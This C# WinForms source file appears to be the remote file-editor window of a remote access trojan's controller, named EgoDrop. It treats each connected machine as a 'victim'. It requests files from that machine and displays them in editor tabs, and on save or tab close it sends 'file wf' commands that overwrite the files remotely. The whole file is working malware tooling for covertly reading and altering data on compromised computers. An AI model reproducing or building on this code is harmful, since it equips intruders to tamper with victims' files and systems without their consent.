using Accessibility;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using ICSharpCode.TextEditorEx;
using ICSharpCode.TextEditor;

namespace EgoDrop
{
    public partial class frmFileEditor : Form
    {
        public clsVictim m_victim { get; set; }
        private Dictionary<string, Action> m_dicActEvent = new Dictionary<string, Action>();

        private struct stControl
        {
            public string szFilePath;

            public TextBox tbPath;
            public TextEditorControlEx editor;
            public TextBox tbSearch;

            public stControl(string szFilePath, TextBox tbPath, TextEditorControlEx editor, TextBox tbSearch)
            {
                this.szFilePath = szFilePath;

                this.tbPath = tbPath;
                this.editor = editor;
                this.tbSearch = tbSearch;
            }
        }

        public frmFileEditor(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbSameVictim(victim, m_victim))
                return;

            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "file")
                {
                    if (lsMsg[1] == "wf") //Write file.
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        string szFilePath = lsMsg[3];

                        TabPage page = fnFindTabWithPath(szFilePath);
                        if (page == null)
                            return;

                        page.Text = page.Text.Replace("*", string.Empty);

                        if (m_dicActEvent.ContainsKey(szFilePath))
                        {
                            m_dicActEvent[szFilePath]();
                            m_dicActEvent.Remove(szFilePath);
                        }
                    }
                    else if (lsMsg[1] == "rf") //Read file.
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        if (nCode == 0)
                        {
                            clsTools.fnShowErrMsgbox(lsMsg[4]);
                            return;
                        }

                        string szFilePath = lsMsg[3];
                        string szFileContent = lsMsg[4];

                        fnAddNewPage(szFilePath, szFileContent);
                    }
                }
            }));
        }

        private stControl fnGetControls(TabPage page)
        {
            if (page.Tag == null)
                return new stControl() { };

            return (stControl)page.Tag;
        }

        private TabPage fnFindTabWithPath(string szFilePath)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                stControl st = fnGetControls(page);
                if (string.Equals(st.szFilePath, szFilePath))
                    return page;
            }

            return null;
        }

        public void fnAddNewPage(string szFilePath, string szFileContent)
        {
            TabPage page = new TabPage();
            TextEditorControlEx editor = new TextEditorControlEx();
            TextBox tbPath = new TextBox();
            TextBox tbSearch = new TextBox();

            foreach (TabPage p in tabControl1.TabPages)
            {
                stControl st = fnGetControls(p);
                if (string.Equals(st.szFilePath, szFilePath))
                {
                    tbPath = st.tbPath;
                    editor = st.editor;
                    tbSearch = st.tbSearch;

                    page = p;

                    tabControl1.SelectedTab = page;
                }
            }

            if (!tabControl1.TabPages.Contains(page))
            {
                tabControl1.TabPages.Add(page);

                page.Controls.AddRange(new Control[]
                {
                    tbPath,
                    tbSearch,
                    editor,
                });

                tbPath.Dock = DockStyle.Top;
                tbSearch.Dock = DockStyle.Bottom;
                editor.Dock = DockStyle.Fill;

                editor.BringToFront();

                editor.KeyDown += editor_KeyDown;

                editor.Text = szFileContent;
                editor.TextChanged += editor_TextChanged;

                page.Tag = new stControl(szFilePath, tbPath, editor, tbSearch);
            }

            page.Text = szFilePath.Split('/').Last();
            tbPath.Text = szFilePath;
        }

        private void fnSetup()
        {
            tabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
            tabControl1.Padding = new Point(20, 4);

            tabControl1.TabPages.Clear();

            m_victim.m_listener.evtReceivedMessage += fnRecv;
        }

        private void frmFileEditor_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmFileEditor_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecv;
        }

        private void editor_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                TabPage page = tabControl1.SelectedTab;
                if (page == null)
                    return;

                if (e.KeyCode == Keys.W)
                {

                }
                else if (e.KeyCode == Keys.S)
                {
                    var control = fnGetControls(page);

                    if (page.Text.Contains("*"))
                    {
                        m_victim.fnSendCommand(new string[]
                        {
                            "file",
                            "wf",
                            control.szFilePath,
                            control.editor.Text,
                        });
                    }
                }
                else if (e.KeyCode == Keys.F)
                {
                    var control = fnGetControls(page);
                    control.tbSearch.Focus();
                }
            }
            else
            {

            }
        }

        private void editor_TextChanged(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
                return;

            if (!page.Text.Contains("*"))
                page.Text += "*";
        }

        private void tabControl1_DrawItem(object sender, DrawItemEventArgs e)
        {
            var tab = tabControl1.TabPages[e.Index];
            var rect = e.Bounds;

            TextRenderer.DrawText(
                e.Graphics,
                tab.Text,
                tab.Font,
                rect,
                tab.ForeColor,
                TextFormatFlags.Left | TextFormatFlags.VerticalCenter
            );

            Rectangle closeRect = new Rectangle(
                rect.Right - 15,
                rect.Top + (rect.Height - 12) / 2,
                12,
                12
            );

            e.Graphics.DrawString("X", e.Font, Brushes.Black, closeRect.Location);
        }

        private void tabControl1_MouseDown(object sender, MouseEventArgs e)
        {
            for (int i = 0; i < tabControl1.TabPages.Count; i++)
            {
                var rect = tabControl1.GetTabRect(i);
                Rectangle closeRect = new Rectangle(
                    rect.Right - 15,
                    rect.Top + (rect.Height - 12) / 2,
                    12,
                    12
                );

                if (closeRect.Contains(e.Location))
                {
                    tabControl1.TabPages.RemoveAt(i);
                    break;
                }
            }
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
                return;

            var controls = fnGetControls(page);
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.W) //Close tab.
                {
                    if (page.Text.Contains("*"))
                    {
                        DialogResult dr = MessageBox.Show("Do you want to save changes?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Warning);
                        if (dr == DialogResult.Cancel)
                        {
                            return;
                        }
                        else if (dr == DialogResult.Yes)
                        {
                            m_dicActEvent.Add(controls.tbPath.Text, () =>
                            {
                                tabControl1.TabPages.Remove(page);
                            });

                            m_victim.fnSendCommand(new string[]
                            {
                                "file",
                                "wf",
                                controls.tbPath.Text,
                                controls.editor.Text,
                            });
                        }
                        else
                        {
                            tabControl1.TabPages.Remove(page);
                        }
                    }
                }
                else if (e.KeyCode == Keys.S) //Save file.
                {
                    m_victim.fnSendCommand(new string[]
                    {
                        "file",
                        "wf",
                        controls.tbPath.Text,
                        controls.editor.Text,
                    });
                }
            }
            else
            {
                
            }
        }
    }
}
